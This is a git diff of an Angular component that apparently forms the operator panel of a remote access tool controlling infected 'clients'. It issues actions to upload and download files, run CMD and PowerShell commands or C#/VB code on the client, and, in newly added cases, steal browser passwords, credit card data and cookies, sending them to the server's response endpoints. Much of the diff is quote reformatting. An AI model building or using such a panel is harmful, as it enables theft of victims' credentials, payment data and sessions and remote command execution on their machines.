@@ -1,31 +1,38 @@
-import { CommonModule } from '@angular/common';
-import { Component, EventEmitter, Input, Output } from '@angular/core';
-import { FormsModule } from '@angular/forms';
-import { ClientService } from '../../../../services/client.service';
-import { Router } from '@angular/router';
-import { ToastService } from '../../../../../toast.service';
-import { MonacoEditorModule } from 'ngx-monaco-editor-v2';
-import { MonacoEditorConfigModule } from '../../../../../monaco-editor-config';
+import { CommonModule } from "@angular/common";
+import { Component, EventEmitter, Input, Output } from "@angular/core";
+import { FormsModule } from "@angular/forms";
+import { ClientService } from "../../../../services/client.service";
+import { Router } from "@angular/router";
+import { ToastService } from "../../../../../toast.service";
+import { MonacoEditorModule } from "ngx-monaco-editor-v2";
+import { MonacoEditorConfigModule } from "../../../../../monaco-editor-config";
+import { environment } from "../../../../../../environments/environment";
+import { response } from "express";
 
 @Component({
-  selector: 'app-create-instruction',
+  selector: "app-create-instruction",
   standalone: true,
-  imports: [CommonModule, FormsModule,MonacoEditorModule,MonacoEditorConfigModule],
-  templateUrl: './create-instruction.component.html',
-  styleUrl: './create-instruction.component.scss',
+  imports: [
+    CommonModule,
+    FormsModule,
+    MonacoEditorModule,
+    MonacoEditorConfigModule,
+  ],
+  templateUrl: "./create-instruction.component.html",
+  styleUrl: "./create-instruction.component.scss",
 })
 export class CreateInstructionComponent {
-  editorOptions = {theme: 'vs-dark', language: 'csharp'};
+  editorOptions = { theme: "vs-dark", language: "csharp" };
 
-  ErrorMessage: string = '';
+  ErrorMessage: string = "";
 
   selectedOption: number = 0;
 
-  firstInputPlaceHolder: string = 'File Upload Path';
-  secondInputPlaceHolder: string = 'Download Link';
+  firstInputPlaceHolder: string = "File Upload Path";
+  secondInputPlaceHolder: string = "Download Link";
 
-  firstInputValue: string = '';
-  secondInputValue: string = '';
+  firstInputValue: string = "";
+  secondInputValue: string = "";
 
   @Input()
   ClientId!: string | null;
@@ -39,30 +46,30 @@ export class CreateInstructionComponent {
   ) {}
 
   onOptionChange(event: any) {
-    this.ErrorMessage = '';
-    this.firstInputValue = '';
-    this.secondInputValue = '';
+    this.ErrorMessage = "";
+    this.firstInputValue = "";
+    this.secondInputValue = "";
     this.selectedOption = Number(event.target.value);
     switch (this.selectedOption) {
       case 0: {
-        this.firstInputPlaceHolder = 'File To Upload Path';
+        this.firstInputPlaceHolder = "File To Upload Path";
         break;
       }
       case 1: {
-        this.firstInputPlaceHolder = 'File Download Destination';
+        this.firstInputPlaceHolder = "File Download Destination";
         break;
       }
       case 2: {
-        this.firstInputPlaceHolder = 'CMD Command';
+        this.firstInputPlaceHolder = "CMD Command";
         break;
       }
       case 3: {
-        this.firstInputPlaceHolder = 'PowerShell Command';
+        this.firstInputPlaceHolder = "PowerShell Command";
         break;
       }
       case 9: {
-        this.firstInputPlaceHolder = 'C# Code';
-        this.firstInputValue=`using System.Threading.Tasks;
+        this.firstInputPlaceHolder = "C# Code";
+        this.firstInputValue = `using System.Threading.Tasks;
 public class Script
 {
   public static async Task<string> ExecuteAsync{
@@ -72,38 +79,43 @@ public class Script
 
       // return "output";
   }
-}`
-        this.editorOptions = {theme: 'vs-dark', language: 'csharp'};
+}`;
+        this.editorOptions = { theme: "vs-dark", language: "csharp" };
 
         break;
       }
       case 10: {
-        this.firstInputPlaceHolder = 'VB Code';
-        this.editorOptions = {theme: 'vs-dark', language: 'vb'};
-        this.firstInputValue=`Public Class Script
+        this.firstInputPlaceHolder = "VB Code";
+        this.editorOptions = { theme: "vs-dark", language: "vb" };
+        this.firstInputValue = `Public Class Script
     Public Sub Execute()
         '    1. Make Sure There's A Class With name Script
         '    2. The Function that will be executed must be named "Execute" Similiar To Main Function
         '    3. Everything Else Is the same
     End Sub
-End Class`
+End Class`;
         break;
       }
     }
   }
   CreateInst() {
-    this.ErrorMessage = '';
-    var valueToSubmit = '';
+    this.ErrorMessage = "";
+    var valueToSubmit = "";
+    var notify = true;
     if (this.ClientId != null) {
       switch (this.selectedOption) {
-        
         case 0: {
-          valueToSubmit = this.firstInputValue;
+          valueToSubmit =
+            environment.apiUrl +
+            "Response/File/" +
+            this.ClientId +
+            "*.&-&.*" +
+            this.firstInputValue;
           break;
         }
         case 1: {
           valueToSubmit =
-            this.firstInputValue + '*.&-&.*' + this.secondInputValue;
+            this.firstInputValue + "*.&-&.*" + this.secondInputValue;
           break;
         }
         case 2: {
@@ -122,33 +134,44 @@ End Class`
           valueToSubmit = this.firstInputValue;
           break;
         }
+        case 6:{
+          valueToSubmit = environment.apiUrl + "Response/Browser/Password/" + this.ClientId;
+          break;
+        }
+        case 7:{
+          valueToSubmit = environment.apiUrl + "Response/Browser/CreditCard/" + this.ClientId;
+          break;
+        }
+        case 8:
+          valueToSubmit = environment.apiUrl + "Response/Browser/Cookies/" + this.ClientId;
+          break;
       }
       const createInst = this.clientService.CreateClientAction(this.ClientId, {
         code: this.selectedOption,
         functionArgs: valueToSubmit,
-        notify:true,
+        notify: notify,
       });
       if (createInst != null) {
         createInst.subscribe(
           (response) => {
             this.ReloadData.emit();
-            this.toastService.showToast('Created Successfully!');
+            this.toastService.showToast("Created Successfully!");
           },
           (error) => {
             if (error.status == 401) {
-              this.ErrorMessage = 'Try To Login Again';
-              this.router.navigate(['/Logout']);
+              this.ErrorMessage = "Try To Login Again";
+              this.router.navigate(["/Logout"]);
             } else if (error.status == 404) {
-              this.ErrorMessage = 'Not Found';
-              this.router.navigate(['/Client']);
+              this.ErrorMessage = "Not Found";
+              this.router.navigate(["/Client"]);
             } else {
-              this.ErrorMessage = 'Something went wrong....';
+              this.ErrorMessage = "Something went wrong....";
             }
           }
         );
       }
-      this.firstInputValue = '';
-      this.secondInputValue = '';
+      this.firstInputValue = "";
+      this.secondInputValue = "";
     }
   }
 }
